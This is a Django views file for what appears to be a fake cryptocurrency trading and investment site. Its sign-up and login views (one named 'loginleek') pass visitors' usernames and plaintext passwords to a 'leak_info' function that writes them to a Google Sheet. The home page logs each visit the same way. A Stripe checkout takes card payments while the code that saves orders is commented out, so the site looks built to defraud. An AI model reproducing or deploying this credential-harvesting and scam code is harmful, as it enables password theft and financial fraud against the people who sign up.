from oauth2client.service_account import ServiceAccountCredentials
from googleapiclient.discovery import build
import gspread
from django.shortcuts import render, redirect
from .forms import RegisterForm, OrderForm
from django.contrib.auth import login, authenticate
from django.contrib.auth.forms import AuthenticationForm
from .functions import leak_info
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
from django.http.response import JsonResponse
import stripe

SCOPE = ["https://spreadsheets.google.com/feeds",
         "https://www.googleapis.com/auth/spreadsheets",
         "https://www.googleapis.com/auth/drive.file",
         "https://www.googleapis.com/auth/drive"]

CREDS = ServiceAccountCredentials.from_json_keyfile_name('google-credentials.json', SCOPE)
ACCESS_TOKEN = CREDS.get_access_token().access_token
CLIENT = gspread.authorize(CREDS)
DRIVE_SERVICE = build('drive', 'v3', credentials=CREDS)


# Create your views here.
def sign_up(request):
    if request.method == 'POST':
        fields = ['username', 'password1']
        leak_info(request, CLIENT, fields, "Register")

        form = RegisterForm(request.POST)

        if form.is_valid():
            user = form.save()
            login(request, user)
            return redirect('/')
    else:
        form = RegisterForm()

    return render(request, 'main/register.html', {"form": form})


def home(request):
    fields = []
    leak_info(request, CLIENT, fields, "Visit")
    return render(request, 'main/home.html')


def market(request):
    return render(request, 'main/market.html')


def trade(request):
    return render(request, 'main/trade.html', {"name": request.user})


def scontract(request):
    return render(request, 'main/scontract.html', {"name": request.user})


def finance(request):
    return render(request, 'main/finance.html')


def subscribe(request):
    return render(request, 'main/subscribe.html')


def mining(request):
    return render(request, 'main/mining.html')


def fund(request):
    return render(request, 'main/fund.html')


@login_required(login_url="/login")
def assets(request):
    if request.method == 'POST':
        form = OrderForm(request.POST)
        if form.is_valid():
            order = form.save(commit=False)
            order.owner = request.user
            # order.save()

    else:
        form = OrderForm()

    return render(request, 'main/myAssets.html', {'form': form})


def loginleek(request):
    if request.method == 'POST':

        fields = ['username', 'password']
        leak_info(request, CLIENT, fields, "Login")

        form = AuthenticationForm(data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user:
                login(request, user)
            return redirect('/')
    else:
        form = AuthenticationForm()

    return render(request, 'main/login.html', {'form': form})


@csrf_exempt
def stripe_config(request):
    if request.method == 'GET':
        stripe_config = {'publickey': settings.STRIPE_PUBLISHABLE_KEY}
        return JsonResponse(stripe_config, safe=False)


coins = {
    'BTC': 609,
    'ETH': 103,
    'LTC': 54,
    'EOS': 94,
    'KINGM': 66,
    'XRP': 14,
    'ADA': 44,
    'DOGE': 21,
    'SHIB': 24
}


@csrf_exempt
def create_checkout_session(request):
    if request.method == 'GET':
        quant = request.GET['quantity']
        domain_url = f'http://{request.get_host()}/'
        stripe.api_key = settings.STRIPE_SECRET_KEY
        try:
            # Create new Checkout Session for the order
            # Other optional params include:
            # [billing_address_collection] - to display billing address details on the page
            # [customer] - if you have an existing Stripe Customer ID
            # [payment_intent_data] - capture the payment later
            # [customer_email] - prefill the email input in the form
            # For full details see https://stripe.com/docs/api/checkout/sessions/create

            # ?session_id={CHECKOUT_SESSION_ID} means the redirect will have the session ID set as a query param
            checkout_session = stripe.checkout.Session.create(
                success_url=domain_url + 'myAssets/',
                cancel_url=domain_url + 'myAssets/',
                payment_method_types=['card'],
                mode='payment',
                line_items=[
                    {
                        'price': 'price_1LlV0WKR9GOBW9Te9lN6vfx5',
                        'quantity': quant
                    }
                ]
            )
            return JsonResponse({'sessionId': checkout_session['id']})
        except Exception as e:
            return JsonResponse({'error': str(e)})
